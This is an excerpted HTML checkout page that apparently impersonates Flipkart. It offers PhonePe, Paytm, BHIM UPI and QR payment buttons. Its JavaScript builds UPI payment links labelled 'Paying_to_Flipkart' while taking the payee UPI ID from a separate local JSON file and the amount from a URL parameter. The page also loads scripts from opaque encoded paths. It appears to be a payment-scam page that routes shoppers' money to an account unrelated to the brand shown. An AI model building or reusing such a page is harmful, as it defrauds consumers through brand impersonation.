...
<head>
    ...
    <style>
        ...
        * {
        ...
        ._2dxSCm .search-div:before {
            background: url('../images/theme/search.html');
        }
        ...
        .share-icon {
            ...
            background-image: url(../img/share.html);
        ...
        .love-icon {
            ...
            background-repeat: no-repeat;
            background-position: center;
            background-image: url(../img/love.html);
            background-size: 24px 24px;
            border-radius: 18px;
            position: absolute;
            right: 0;
    ...
    <script type="text/javascript"
        src="/PXM-b-v1gUTI-NwPrAw_ZPU6aFUIdZgC92W3JsQgvCEIlPz2HTw5IV3kaqIOqkm8IGCcJpqh6aBKFQm6KmTpjw=="></script>
    <script type="text/javascript"
        src="/CfWewcZ5ywj9Xk-l7tfx615Ij0Td0UbEcX8cY95j5CqQYT4Gz6OfhhLhfh7APkoHC57gqRwv7SQ-opVm_3b-ZA=="></script>
</head>
...
<body class="expansion-alids-init" cz-shortcut-listen="true">
        ...
        <div class="_1fhgRH mb-70">
                ...
                <div class="progress-box mb-0">
                    <svg width="360" height="56" viewBox="0 0 360 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                        ...
                        <path
                            ...
                            fill="#F4F8FF" stroke="#2874F0"></path>
                        ...
                        <path
                            ...
                            fill="#212121"></path>
                        <path fill-rule="evenodd" clip-rule="evenodd"
                            d="M78 17.5H162V18.5H78V17.5ZM198 17.5H282V18.5H198V17.5Z" fill="#2874F0"></path>
                    </svg>
                </div>
            </div>
            <div class="card py-1 my-1">
                <div class="py-2 px-3">
                    ...
                    <div
                        style="display: flex; align-items: center; gap: 15px;  font-size: 10px; font-weight: 300; letter-spacing: -0.02px; line-height: 28px;">
                        <span>PAY ONLINE (PhonePe/Paytm/Scan) </span>
                        <div style="background-color: rgb(206, 206, 222); height: 1px; flex-grow: 1;"></div>
                    </div>
                    <br>
                    <!-- Payment options -->
                    <div class="form-check available-method active" pay-type="phonepe">
                        <label class="form-check-label">
                            <img src="phonepay.png" class="pay-logo" alt="PhonePe">
                    ...
                    <div class="form-check available-method" pay-type="paytm">
                        <label class="form-check-label">
                            <img src="paytm_icon.svg" class="pay-logo" alt="Paytm">
                    ...
                    <div class="form-check available-method" pay-type="bhim_upi">
                        <label class="form-check-label">
                            <img src="bhim_upi.svg" class="pay-logo" alt="Bhim UPI">
                    ...
                    <div class="form-check available-method" pay-type="bhim_upi">
                        <label class="form-check-label">
                            <img src="upi.png" class="pay-logo" alt="Other UPI">
                    ...
                    <center>
                        <button
                            style="background:#FFBF00; width:330px;height:40px; border-radius:10px; color: #000000;border:none;font-size: 15px;"
    ...
    <script>
        ...
        // Function to fetch UPI ID and transaction ID from info.json
        ...
        async function payNow() {
            var price = getUrlParameter('price') || "179";
            ...
            var tr = upiDetails.tr;
            // Transaction ID fetched from upi.json
            var redirect_url = "";
            ...
            switch (payType) {
                case 'phonepe':
                    redirect_url = `phonepe://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${price}`;
                    break;

                case 'paytm':
                    redirect_url = `paytmmp://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${price}`;
                    break;

                case 'bhim_upi':
                    redirect_url = `upi://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${price}`;
                    break;

                case 'scan':
                    redirect_url = `https://upiqr.in/api/qr?name=FLIPKART%20store&vpa=${upiId}&amount=${price}`;
                    break;
    ...
    <script>
      ...
      <img src="${product.image}" width="120"><br>
    ...
    `;
            ...
            document.getElementById('order-summary').innerText = 'No product selected.';
        }
    </script>
